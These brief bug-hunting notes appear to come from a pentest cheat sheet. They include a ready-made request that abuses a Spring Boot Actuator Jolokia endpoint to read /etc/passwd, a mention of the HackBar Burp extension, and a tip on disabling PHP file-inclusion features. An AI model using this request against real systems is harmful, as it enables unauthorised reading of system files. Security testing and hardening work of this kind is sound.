-> if you find /actuator/jolokia/ endpoint in your target then escalate to LFI -> `https://target[.]com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd`


-> HackBar extension burp


-> Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.